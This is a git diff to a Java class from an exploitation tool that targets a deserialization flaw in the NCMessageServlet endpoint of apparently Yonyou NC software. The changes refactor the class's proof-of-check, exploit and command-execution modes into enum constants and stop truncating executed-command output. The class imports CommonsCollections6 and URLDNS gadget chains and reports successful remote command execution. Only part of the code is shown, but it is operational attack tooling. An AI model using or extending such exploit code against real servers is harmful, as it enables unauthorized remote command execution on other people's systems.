@@ -1,8 +1,9 @@
 package com.chave.vuln;
 
-import com.chave.bean.ClassCode;
-import com.chave.bean.ClassName;
-import com.chave.bean.Config;
+import com.chave.config.ClassCode;
+import com.chave.config.ClassName;
+import com.chave.config.Config;
+import com.chave.config.Mod;
 import com.chave.gadget.chain.CommonsCollections6_Array;
 import com.chave.gadget.chain.URLDNS;
 import com.chave.proxy.HttpProxy;
@@ -38,13 +39,13 @@ public class NCMessageServlet_Unserialize extends VulnBase {
         String vulnerable_url = Config.TARGET + "/servlet/~baseapp/nc.message.bs.NCMessageServlet";
 
         try {
-            if (Config.MOD.equals("poc")) {
+            if (Config.MOD.equals(Mod.POC)) {
                 poc(vulnerable_url);
                 return;
-            } else if (Config.MOD.equals("exp")) {
+            } else if (Config.MOD.equals(Mod.EXP)) {
                 exp(vulnerable_url);
                 return;
-            } else if (Config.MOD.equals("exec")) {
+            } else if (Config.MOD.equals(Mod.EXEC)) {
                 exec(vulnerable_url);
                 return;
             }
@@ -158,7 +159,7 @@ public class NCMessageServlet_Unserialize extends VulnBase {
             int responseCode = HttpUtil.getResponseCode(exec_conn);
             String responseText = HttpUtil.getResponseText(exec_conn);
             if (responseCode == HttpURLConnection.HTTP_OK && responseText != null && !responseText.isEmpty()) {
-                logExec("[+] 命令执行成功!\n" + responseText.substring(0, responseText.length() - 3506));
+                logExec("[+] 命令执行成功!\n" + responseText);
                 return;
             } else {
                 logExec("[-] 命令执行失败. 请尝试手动利用.");
